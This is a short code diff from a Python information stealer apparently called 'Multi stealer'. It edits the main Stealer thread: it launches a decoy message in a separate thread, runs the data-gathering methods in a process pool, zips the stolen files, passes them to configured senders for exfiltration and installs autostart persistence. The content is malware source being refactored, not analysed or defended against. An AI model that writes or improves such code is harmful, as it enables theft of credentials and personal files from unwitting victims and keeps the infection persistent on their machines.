@@ -195,14 +195,16 @@ class Stealer(Thread):
 
             sleep(self.__delay)
 
+            if self.__message is True:
+                Thread(target=Message().run).start()
+
             with Pool(processes=self.__config.PoolSize) as pool:
                 results = pool.starmap(functions.run_process, [
                     (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
                 ])
             pool.close()
 
-            filtered_results = [item for item in results if item]
-            data = self.__storage.create_zip([item for sublist in filtered_results for item in sublist])
+            data = self.__storage.create_zip([file for files in results if files for file in files])
 
             for sender in self.__senders:
                 sender.run(self.__config.ZipName, data)
@@ -212,9 +214,6 @@ class Stealer(Thread):
 
             if self.__autostart is True:
                 Autostart(argv[0]).run()
-
-            if self.__message is True:
-                Message().run()
 
         except Exception as e:
             print(f"[Multi stealer]: {repr(e)}")
